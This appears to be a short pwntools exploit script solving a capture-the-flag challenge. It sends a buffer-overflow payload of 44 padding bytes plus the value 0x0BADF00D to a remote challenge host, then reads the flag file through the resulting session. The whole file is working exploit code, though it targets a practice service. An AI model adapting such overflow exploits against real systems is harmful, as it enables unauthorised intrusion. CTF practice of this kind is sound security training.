from pwn import *

context.log_level = 'info'

payload = b'A' * 44 + p32(0x0BADF00D)

io = remote('chal.thjcc.org', 11037)
io.recvuntil(b'what do you want to eat?\n')
io.sendline(payload)

io.sendline(b'cat flag.txt')
io.interactive()
